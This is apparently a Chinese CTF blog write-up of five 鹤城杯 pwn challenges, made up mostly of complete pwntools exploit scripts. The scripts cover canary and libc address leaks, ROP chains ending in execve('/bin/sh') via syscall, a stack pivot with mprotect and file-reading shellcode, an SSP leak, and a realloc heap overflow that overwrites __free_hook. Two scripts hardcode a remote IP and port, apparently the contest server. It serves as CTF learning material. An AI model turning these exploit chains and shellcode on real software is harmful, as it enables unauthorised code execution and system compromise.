---
title: 鹤城杯pwn
date: 2021-10-10 12:13:21
tags:
    - 32位pwn
    - ssp leak
    - 栈迁移
---

> 共5题，当时没有参加，师傅给的附件自己做的，调休这两天课都是满的，只能找零碎的时间做。不过这也是第一次能把pwn自己做完。



### littleof

有个点就是最后使用`system("/bin/sh");`获取不成功，确实听说过这种情况，不过可以使用`exevce`来获取shell，我就直接用syscall来恶心它了；
```python
#!/usr/bin/env python
from pwn import *

local = 1
debug = 0
binary = "./littleof"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("182.116.62.85",21613)
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)


ru("overflow?")
sl("A"*0x47+"B")
ru("B")
canary = u64(r(8))-0xa
info("canary => 0x%x"%canary)
ru("!")
payload = ""
payload += "/bin/sh\x00".ljust(0x48,"A")
payload += p64(canary)
payload += "V"*8
payload += p64(0x400863)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(0x400789)
sl(payload)
libc.address = r7f()-libc.sym["puts"]
info("libc base => 0x%x"%libc.address)

sl("A")
# raw_input()
payload = ""
payload += "A"*0x48
payload += p64(canary)
payload += "V"*8
payload += p64(gadget("pop rdi;ret"))
payload += p64(libc.search("/bin/sh\x00").next())
payload += p64(gadget("pop rsi;ret"))
payload += p64(0)
payload += p64(gadget("pop rdx;ret"))
payload += p64(0)
payload += p64(gadget("pop rax;ret"))
payload += p64(0x3b)
payload += p64(gadget("syscall;ret"))
sl(payload)
sh()
```
### babyof

这个和上个差不多吧，也记不得具体情况了；
```python
#!/usr/bin/env python
from pwn import *

local = 1
debug = 0
binary = "./babyof"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("182.116.62.85",21613)
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

ru("overflow?")
payload = ""
payload += "A"*0x40
payload += "V"*8
payload += p64(0x400743)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(0x40066B)
raw_input()
sl(payload)
libc.address = r7f() - libc.sym["puts"]
info("libc base => 0x%x"%libc.address)

payload = ""
payload += "A"*0x40
payload += "V"*8
payload += p64(gadget("pop rdi;ret"))
payload += p64(libc.search("/bin/sh\x00").next())
payload += p64(gadget("pop rsi;ret"))
payload += p64(0)
payload += p64(gadget("pop rdx;ret"))
payload += p64(0)
payload += p64(gadget("pop rax;ret"))
payload += p64(0x3b)
payload += p64(gadget("syscall;ret"))
sl(payload)
sh()
```

### onecho

这个确实花了我2个多小时才做出来，32位程序传参不太一样，溢出时可以控制函数参数，我用的是栈迁移注意的是要预留一部分，不然有些复杂的函数，栈就不够用，然后scanf读入(也有阻塞的作用，上一步泄露地址)，之后mprotect修改权限，然后就orw。
```python
#!/usr/bin/env python
from pwn import *

local = 1
debug = 0
binary = "./onecho"
lib = "/lib/i386-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="i386")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

# EBP  0xffffc758 
# ESP  0xffffc6e0 

# 0x08049022 : pop ebx ; ret
# 0x08049812 : pop edi ; pop ebp ; ret
# 0x08049811 : pop esi ; pop edi ; pop ebp ; ret

reg = 0x804cd04
rop = p32(reg+0x200)
rop += p32(elf.plt["puts"])
rop += p32(0x8049813) # pop ebx ; ret
rop += p32(elf.got["puts"])
rop += p32(elf.plt["__isoc99_scanf"])
rop += p32(0x8049812) # pop edi ; pop ebp ; ret
rop += p32(0x804A363) # %s
rop += p32(reg+0x20)  # addr
payload = ""
payload += rop.ljust(0x10c,"A")
payload += p32(reg)
payload += p32(0x80492a5)
payload += p32(reg)
payload += p32(0x400)
r()
raw_input()
sl(payload)
libc.address = u32(ru("\xf7")[-4:]) - libc.sym["puts"]
info("libc base => 0x%x"%libc.address)

shell = "\x6a\x67\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\x31\xd2\xb8\x05\x00\x00\x00\xcd\x80\xbb\x03\x00\x00\x00\x89\xe1\xba\x80\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
rop = ""
rop += p32(libc.sym["mprotect"])
rop += p32(reg+0x34)
rop += p32(0x804c000)
rop += p32(0x1000)
rop += p32(7)
rop += "\x90"
rop += shell

shell = '''
    push 0x67
    push 0x616c662f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    mov eax,0x5
    int 0x80
    mov ebx,0x3
    mov ecx,esp
    mov edx,0x80
    mov eax,0x3
    int 0x80
    mov ebx,0x1
    mov eax,0x4
    int 0x80
'''
# shell = asm(shell,arch="i386")
# print(tohex(shell))
sl(rop)
sh()
```


### easyecho 

这个方法应该是叫做`ssp leak`。

* exp
  
```python
#!/usr/bin/env python
from pwn import *

local = 1
debug = 1
binary = "./easyecho"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

ru("Name:")
s("A"*0x10)
ru("AAAAAAAAAAAAAAAA")
text = u64(r(6)+"\x00\x00")-0xcf0
info("text => 0x%x"%text)
ru("Input: ")
sl("backdoor")
ru("Input: ")
raw_input()
payload = ("V"*0x90).ljust(0x168,'\x00')
payload += p64(text+0x202040)
sl(payload)
ru("Input: ")
sl("exitexit")
sh()
# pwndbg> distance __libc_argv $rbx
# 0x7ffe71eef058->0x7ffe71eeeef0 is -0x168 bytes (-0x2d words)
```

### pwn1-hc
* 思路
  
一般问题出现在难以解释的逻辑里
![](https://files.catbox.moe/pomqe9.png)
就比如这里，当输入的size不相等时，realloc处理后，没有返回值处理。

```powershell
The realloc() function changes the size of the memory block pointed to by ptr to  size  bytes.
The  contents will be unchanged in the range from the start of the region up to the minimum of
the old and new sizes.  If the new size is larger than the old size, the added memory will not
be  initialized.   If ptr is NULL, then the call is equivalent to malloc(size), for all values
of size; if size is equal to zero, and ptr is  not  NULL,  then  the  call  is  equivalent  to
free(ptr).   Unless  ptr  is  NULL, it must have been returned by an earlier call to malloc(),
calloc() or realloc().  If the area pointed to was moved, a free(ptr) is done.
```
那主要思路就是realloc把size改小，之后的读入时依然按照原来size便可溢出了。之后自由的打了。

* exp
  
```python
#!/usr/bin/env python
from pwn import *

local = 1
debug = 0
binary = "./pwn1"
lib = "/lib/i386-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def add(name,size,content):
	sal("your choice>> ","1")
	sal("name:",name)
	sal("price:","1")
	sal("descrip_size:",str(size))
	sal("description:",content)
def change_des(name,size,content):
	sal("your choice>> ","5")
	sal("name:",name)
	sal("descrip_size:",str(size))
	sal("description:",content)
def show():
	sal("your choice>> ","3")
def delete(name):
	sal("your choice>> ","2")
	sal("name:",name)

add("apple",0x4c,"A"*8)
add("banana",0x4c,"B"*8)
change_des("apple",0x4c-0x20,"A"*8)
add("orange",0x4c,"O"*8)
payload = ""
payload += "A"*0x2c
payload += p32(0x21)
payload += "orange".ljust(0x10,"\x00")
payload += p32(0x1)
payload += p32(0x4c)
change_des("apple",0x4c,payload)

payload = ""
payload += p32(0)
payload += p32(0x21)
payload += "apple".ljust(0x10,"\x00")
payload += p32(0x1)
payload += p32(0x4c)
payload += p32(0x804b010)
payload += chr(0x31)
change_des("orange",0x4c,payload)
show()
libc.address = u32(ru('\xf7')[-4:])-libc.sym["read"]
info("libc base => 0x%x"%libc.address)

payload = ""
payload += p32(0)
payload += p32(0x21)
payload += "apple".ljust(0x10,"\x00")
payload += p32(0x1)
payload += p32(0x4c)
payload += p32(libc.sym["__free_hook"]-8)
payload += chr(0x31)
change_des("orange",0x4c,payload)

payload = "/bin/sh\x00"
payload += p32(libc.sym["system"]) 
change_des("apple",0x4c,payload)
delete("apple")
sh()
```
